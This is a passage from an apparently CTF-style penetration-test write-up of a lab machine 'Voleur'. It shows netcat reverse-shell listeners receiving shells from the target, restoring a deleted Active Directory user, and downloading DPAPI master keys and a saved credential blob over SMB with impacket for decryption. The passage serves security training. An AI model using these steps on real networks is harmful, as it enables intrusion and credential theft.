<p><strong>4.2 Deleted User Discovery (cf.</strong> <a href="https://activedirectorypro.com/restore-deleted-active-directory-user/">https://activedirectorypro.com/restore-deleted-active-directory-user/</a>)</p>
<p>With our netcat listening on port 8084</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">8084</span>                                                                                                                                
</span></span><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#ae81ff">8084</span>
</span></span><span style="display:flex;"><span>Connection received on 10.129.196.199 <span style="color:#ae81ff">59702</span>
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.20348.3807<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>voleur<span style="color:#ae81ff">\s</span>vc_ldap
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;powershell
</span></span><span style="display:flex;"><span>powershell
</span></span><span style="display:flex;"><span>Windows PowerShell
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; Get-ADObject -IncludeDeletedObjects -Filter <span style="color:#e6db74">&#39;IsDeleted -eq $true -and ObjectClass -eq &#34;user&#34;&#39;</span>
</span></span><span style="display:flex;"><span>Get-ADObject -IncludeDeletedObjects -Filter <span style="color:#e6db74">&#39;IsDeleted -eq $true -and ObjectClass -eq &#34;user&#34;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Deleted           : True
</span></span><span style="display:flex;"><span>DistinguishedName : CN<span style="color:#f92672">=</span>Todd Wolfe<span style="color:#ae81ff">\0</span>ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>voleur,DC<span style="color:#f92672">=</span>htb
</span></span><span style="display:flex;"><span>Name              : Todd Wolfe
</span></span><span style="display:flex;"><span>                    DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
</span></span><span style="display:flex;"><span>ObjectClass       : user
</span></span><span style="display:flex;"><span>ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; Restore-ADObject -Identity <span style="color:#e6db74">&#34;CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Restore-ADObject -Identity <span style="color:#e6db74">&#34;CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb&#34;</span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; 
</span></span><span style="display:flex;"><span>PS C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; net user /domain
</span></span><span style="display:flex;"><span>net user /domain
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User accounts <span style="color:#66d9ef">for</span> <span style="color:#ae81ff">\\</span>DC
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-------------------------------------------------------------------------------
</span></span><span style="display:flex;"><span>Administrator            krbtgt                   svc_ldap                 
</span></span><span style="display:flex;"><span>todd.wolfe               
</span></span><span style="display:flex;"><span>The command completed successfully.
</span></span></code></pre></td></tr></table>
</div>
</div><p>The PowerShell query for deleted Active Directory objects revealed the presence of Todd Wolfe&rsquo;s deleted account. Deleted accounts often retain valuable data and credentials, as administrators may not properly clean up associated files and profiles when accounts are removed.</p>
<p><strong>Found:</strong> Todd Wolfe (deleted user)</p>
<p>The account of Todd Wolfe was successfully restrored. Todd Wolfe is member of Second-Line Support</p>
<p><img src="/images/writeups/htb/voleur/todd_wolfe.png" alt="Todd Wolfe on Bloodhound"></p>
<p>Once restored, we run runas.exe one more time to get access as todd.wolfe</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>hexhunter404㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nc -lvnp <span style="color:#ae81ff">8092</span>
</span></span><span style="display:flex;"><span>Listening on 0.0.0.0 <span style="color:#ae81ff">8092</span>
</span></span><span style="display:flex;"><span>Connection received on 10.129.196.199 <span style="color:#ae81ff">61323</span>
</span></span><span style="display:flex;"><span>Microsoft Windows <span style="color:#f92672">[</span>Version 10.0.20348.3807<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;whoami
</span></span><span style="display:flex;"><span>whoami
</span></span><span style="display:flex;"><span>voleur<span style="color:#ae81ff">\t</span>odd.wolfe
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt;powershell
</span></span><span style="display:flex;"><span>powershell
</span></span><span style="display:flex;"><span>Windows PowerShell
</span></span><span style="display:flex;"><span>Copyright <span style="color:#f92672">(</span>C<span style="color:#f92672">)</span> Microsoft Corporation. All rights reserved.
</span></span></code></pre></td></tr></table>
</div>
</div><p>Nothing was really interesting found inside C:\Users\todd.wolfe</p>
<p>Next step is to explore C:\IT\Second-Line Support now that we have access to the folder.</p>
<p><strong>4.3 Archived Profile Discovery</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; cd <span style="color:#e6db74">&#34;C:\IT\Second-Line Support\Archived Users&#34;</span>
</span></span><span style="display:flex;"><span>C:<span style="color:#ae81ff">\W</span>indows<span style="color:#ae81ff">\s</span>ystem32&gt; Get-ChildItem -Recurse -Force -Hidden
</span></span></code></pre></td></tr></table>
</div>
</div><p>The exploration of archived user profiles revealed that the organization maintained copies of user data even after account deletion. This practice, while potentially useful for data recovery, creates significant security risks as it preserves sensitive information including cached credentials and DPAPI-protected data.</p>
<p>An important hidden folder discovered was (S-1-5-21-3927696377-1337352550-2781715495-1110 being the sid of todd.wolfe):</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e6db74">&#34;Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>4.4 DPAPI Files Extraction</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/hexhunter404/Downloads<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─# ntpdate voleur.htb <span style="color:#f92672">&amp;&amp;</span> impacket-smbclient -k <span style="color:#e6db74">&#39;voleur.htb/todd.wolfe@dc.voleur.htb&#39;</span> -no-pass
</span></span><span style="display:flex;"><span>2025-07-06 22:18:36.728139 <span style="color:#f92672">(</span>+0200<span style="color:#f92672">)</span> +28799.988984 +/- 0.009491 voleur.htb 10.129.196.199 s1 no-leap
</span></span><span style="display:flex;"><span>CLOCK: time stepped by 28799.988984
</span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Type help <span style="color:#66d9ef">for</span> list of commands
</span></span><span style="display:flex;"><span><span style="color:#75715e"># shares</span>
</span></span><span style="display:flex;"><span>ADMIN$
</span></span><span style="display:flex;"><span>C$
</span></span><span style="display:flex;"><span>Finance
</span></span><span style="display:flex;"><span>HR
</span></span><span style="display:flex;"><span>IPC$
</span></span><span style="display:flex;"><span>IT
</span></span><span style="display:flex;"><span>NETLOGON
</span></span><span style="display:flex;"><span>SYSVOL
</span></span><span style="display:flex;"><span><span style="color:#75715e"># use IT</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd Second-Line Support</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 16:13:09 <span style="color:#ae81ff">2025</span> .
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 16:13:09 <span style="color:#ae81ff">2025</span> ..
</span></span><span style="display:flex;"><span>-rw-rw-rw-        <span style="color:#ae81ff">740</span>  Wed Jan <span style="color:#ae81ff">29</span> 14:09:25 <span style="color:#ae81ff">2025</span> 08949382-134f-4c63-b93c-ce52efc0aa88
</span></span><span style="display:flex;"><span>-rw-rw-rw-        <span style="color:#ae81ff">900</span>  Wed Jan <span style="color:#ae81ff">29</span> 13:53:08 <span style="color:#ae81ff">2025</span> BK-VOLEUR
</span></span><span style="display:flex;"><span>-rw-rw-rw-         <span style="color:#ae81ff">24</span>  Wed Jan <span style="color:#ae81ff">29</span> 13:53:08 <span style="color:#ae81ff">2025</span> Preferred
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get 08949382-134f-4c63-b93c-ce52efc0aa88</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get BK-VOLEUR</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get Preferred</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cd Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ls</span>
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 16:13:09 <span style="color:#ae81ff">2025</span> .
</span></span><span style="display:flex;"><span>drw-rw-rw-          <span style="color:#ae81ff">0</span>  Wed Jan <span style="color:#ae81ff">29</span> 16:13:09 <span style="color:#ae81ff">2025</span> ..
</span></span><span style="display:flex;"><span>-rw-rw-rw-        <span style="color:#ae81ff">398</span>  Wed Jan <span style="color:#ae81ff">29</span> 14:13:50 <span style="color:#ae81ff">2025</span> 772275FAD58525253490A9B0039791D3
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get 772275FAD58525253490A9B0039791D3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># exit</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The extraction of DPAPI (Data Protection API) files represented a sophisticated attack vector. DPAPI is Windows&rsquo; mechanism for protecting sensitive data like saved passwords and certificates. The files extracted included the master key file, backup key, and preferred key, which together could decrypt stored credentials.</p>
<p><strong>4.5 DPAPI Decryption</strong></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
